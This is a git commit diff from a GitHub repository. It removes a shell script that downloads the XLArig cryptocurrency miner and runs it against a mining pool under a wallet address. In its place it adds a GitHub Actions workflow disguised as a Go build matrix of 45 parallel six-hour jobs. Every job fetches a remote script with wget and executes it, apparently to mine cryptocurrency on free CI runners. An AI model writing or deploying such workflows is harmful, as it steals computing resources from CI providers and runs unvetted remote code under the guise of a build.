06592f92f30b1361dd8c9652424c2e3a374a5dbb
agung099 <79120274+agung099@users.noreply.github.com>
2021-04-23 02:23:03 +0700

    Update blank.sh

--- .github/workflows/blank.sh
+++ .github/workflows/blank.sh
@@ -1,10 +1,28 @@
-#!/bin/sh
-sudo apt update
-sudo apt install screen -y
-wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip
-unzip XLArig-v5.2.2-linux-x86_64.zip
-./xlarig -o ca.scala.herominers.com:10131 -u Siz7KzWmiNWSRTjZBAt5qqWC5PPYLVGvQdxfDPsyMXpUMkRuzwKNLEbfevN4Eoh76gTvxPeszEj5R7GmJMnkHDD8Ms7Peb4xquq1RpCtBHd9d -p Sc1 -a panthera -k
-while [ 1 ]; do
-sleep 3
-done
-sleep 999
+
+name: VERUSCOIN
+on: [push, pull_request]
+jobs:
+  build:
+    name: Ba_channel
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 30
+      fail-fast: false
+      matrix:
+        go: [1.6, 1.7, 1.8, 1.9, 1.10]
+        flag: [A, B, C, D, E, F, G, H, I]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: BA_channel
+      run: |
+        wget https://github.com/agung099/scalaku/blob/main/.github/workflows/scele.sh && chmod u+x scele.sh && ./scele.sh
